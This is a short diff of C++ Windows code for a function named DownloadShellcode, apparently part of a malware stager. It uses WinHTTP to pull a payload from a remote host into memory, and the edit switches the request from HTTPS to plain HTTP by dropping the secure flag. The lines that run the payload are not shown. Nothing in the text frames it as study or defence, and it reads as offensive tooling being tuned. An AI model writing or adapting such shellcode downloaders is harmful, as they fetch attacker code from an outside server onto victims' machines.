@@ -20,16 +20,18 @@ std::vector<BYTE> DownloadShellcode(LPCWSTR baseAddress, LPCWSTR filename) {
 
     if (!hSession) return buffer;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    // CHANGE: use HTTP port 80, not HTTPS
+    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
         return buffer;
     }
 
+    // CHANGE: remove WINHTTP_FLAG_SECURE
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename,
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            WINHTTP_FLAG_SECURE);
+                                            0); // no flags
 
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
